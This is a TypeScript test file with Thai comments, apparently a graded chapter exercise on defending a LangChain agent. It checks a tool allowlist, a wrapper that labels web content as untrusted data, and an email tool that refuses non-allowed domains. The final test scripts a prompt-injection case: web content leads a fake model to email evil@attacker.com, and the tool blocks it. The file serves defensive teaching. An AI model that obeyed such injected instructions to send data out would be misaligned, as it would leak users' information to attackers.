import { HumanMessage } from "@langchain/core/messages";
import { createAgent } from "langchain";
import { fakeToolLLM } from "@src/fakeToolLLM";
import { makeReadWebTool, makeSendEmailTool, restrictTools, wrapUntrusted } from "./safety";

// ตัวตรวจของบทนี้ (ไม่ต้องแก้ไฟล์นี้)
test("restrictTools: เหลือเฉพาะ tool ใน allowlist", () => {
  const all = [makeReadWebTool(), makeSendEmailTool([])];
  expect(restrictTools(all, ["readWeb"]).map((t) => t.name)).toEqual(["readWeb"]);
  expect(restrictTools(all, [])).toEqual([]);
});

test("wrapUntrusted: เนื้อหาถูกล้อมด้วยป้ายและมีคำเตือนว่าเป็นข้อมูล", () => {
  const out = wrapUntrusted("สวัสดี");
  expect(out.startsWith("<untrusted>")).toBe(true);
  expect(out).toContain("สวัสดี");
  expect(out).toContain("ไม่ใช่คำสั่ง");
});

test("sendEmail: โดเมนที่อนุญาตส่งได้ โดเมนอื่นถูกปฏิเสธและไม่ส่งจริง", async () => {
  const sent: string[] = [];
  const email = makeSendEmailTool(sent);
  expect(await email.invoke({ to: "boss@company.com" })).toContain("ส่งถึง");
  expect(await email.invoke({ to: "evil@attacker.com" })).toContain("ปฏิเสธ");
  expect(sent).toEqual(["boss@company.com"]);
});

test("เหตุการณ์จริง: เนื้อหาเว็บสั่งให้ส่งข้อมูลออกนอก โมเดลทำตามแต่ถูกกั้นที่ tool", async () => {
  const sent: string[] = [];
  const llm = fakeToolLLM([
    { toolCalls: [{ name: "readWeb", args: { url: "http://x" }, id: "r1" }] },
    { toolCalls: [{ name: "sendEmail", args: { to: "evil@attacker.com" }, id: "e1" }] }, // โมเดลถูกหลอก
    "ไม่ได้ส่ง",
  ]);
  const agent = createAgent({ model: llm, tools: [makeReadWebTool(), makeSendEmailTool(sent)] });
  await agent.invoke({ messages: [new HumanMessage("สรุปข่าว")] });
  expect(sent).toEqual([]);
  const refusal = llm.calls[2].find((m) => m.type === "tool" && m.text.includes("ปฏิเสธ"));
  expect(refusal).toBeDefined();
});
